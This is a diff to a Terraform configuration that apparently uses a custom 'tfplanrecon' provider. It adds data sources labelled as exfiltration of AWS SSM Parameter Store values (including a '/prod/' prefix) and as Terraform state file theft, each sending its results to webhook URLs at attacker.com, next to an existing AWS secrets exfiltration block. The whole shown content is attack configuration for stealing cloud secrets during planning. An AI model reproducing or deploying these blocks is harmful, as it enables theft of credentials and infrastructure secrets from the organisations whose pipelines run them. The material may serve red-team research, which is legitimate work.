@@ -55,3 +55,21 @@ data "tfplanrecon_aws_secrets" "secrets_exfil" {
   region      = "us-west-2"
   webhook_url = "https://attacker.com/secrets"
 }
+
+# AWS SSM Parameter Store exfiltration
+data "tfplanrecon_aws_ssm" "ssm_console" {
+  region = "us-east-1"
+}
+
+# AWS SSM Parameter Store exfiltration with prefix
+data "tfplanrecon_aws_ssm" "ssm_prod" {
+  region           = "us-east-1"
+  parameter_prefix = "/prod/"
+  webhook_url      = "https://attacker.com/ssm-params"
+}
+
+# Terraform state file theft
+data "tfplanrecon_state_theft" "state_exfil" {
+  search_path = "."
+  webhook_url = "https://attacker.com/terraform-states"
+}
